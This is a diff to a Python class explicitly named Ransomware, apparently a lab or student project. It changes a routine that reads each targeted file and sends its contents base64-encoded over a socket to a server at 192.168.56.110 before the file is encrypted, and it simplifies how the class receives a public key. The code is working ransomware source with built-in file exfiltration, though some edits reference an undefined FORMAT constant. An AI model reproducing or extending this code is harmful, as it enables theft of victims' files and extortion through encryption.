@@ -14,6 +14,7 @@ import math
 class Ransomware: 
     SERVER_IP = "192.168.56.110"
     ENCODING = "utf-8"
+    MAX_SIZE = 1024
 
     def __init__(self, host1, host2, number):
         # Construct hostname of the remote server from the first two
@@ -56,20 +57,20 @@ class Ransomware:
         return self._socket
 
     #TODO Rafi/Yusef:
-    def send_file_to_server(self, file_path):
+    def send_file_to_server(self, file_path, file):
             
         """ Opening and reading the file data. """
         file = open(file_path, "r")
         data = file.read()
 
         """ Sending the filename to the server. """
-        self._socket.send("malware.py".encode("utf-8"))
-        msg = self._socket.recv(1024).decode("utf-8")
+        self._socket.send(base64.b64encode(file.encode(Ransomware.FORMAT)))
+        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.FORMAT)
         print(f"[SERVER]: {msg}")
 
         """ Sending the file data to the server. """
-        self._socket.send(data.encode("utf-8"))
-        msg = self._socket.recv(1024).decode("utf-8")
+        self._socket.send(base64.b64encode(data.encode(Ransomware.FORMAT)))
+        msg = base64.b64decode(self._socket.recv(Ransomware.MAX_SIZE)).decode(Ransomware.FORMAT)
         print(f"[SERVER]: {msg}")
         
         """ Closing the file. """
@@ -146,7 +147,7 @@ class Ransomware:
                 number_of_files += 1
 
                 # Send file to server
-                self.send_file_to_server(file_path)
+                self.send_file_to_server(file_path, file)
 
                 # Encrypt file
                 self.encrypt_file(file_path, key)
@@ -178,14 +179,11 @@ class Ransomware:
         filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
         print(f"[RECV] Receiving the public key.")
         file = open(filename, "w")
-        self._socket.send("Filename received.".encode("utf-8"))
+        self._socket.send("Public key filename received.".encode("utf-8"))
  
         """ Receiving the public key from the server. """
-        while True:
-            data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-            file.write(data)
-            if data == "DONE.":
-                break
+        data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+        file.write(data)
           
         print(f"[RECV] Receiving the public key data.")
         #file.write(data)
